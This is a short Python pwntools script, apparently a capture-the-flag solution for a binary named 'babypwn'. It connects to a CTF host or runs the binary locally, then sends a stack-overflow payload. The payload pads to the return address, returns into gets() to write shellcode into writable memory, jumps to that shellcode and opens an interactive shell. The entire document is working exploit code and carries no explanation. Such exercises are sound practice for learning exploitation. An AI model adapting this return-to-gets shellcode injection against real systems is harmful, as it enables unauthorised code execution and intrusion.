#!/usr/bin/env python
from pwn import *

with open("shellcode.bin", "rb") as f :
    shellcode = f.read()
    f.close()

if len(sys.argv) >= 2 :
    p = remote( "oakland40ctf.epfl.ch", 40000)
else :
    p = process("./babypwn")
writable = 0x804b000
gets = 0x8049040

payload = cyclic(cyclic_find("xaaa"))
payload += p32(gets) + p32(writable) + p32(writable) + p32(len(shellcode)) + "\x00"

p.sendline(payload + "\x00")
p.sendline(shellcode + "\x00")

p.interactive()
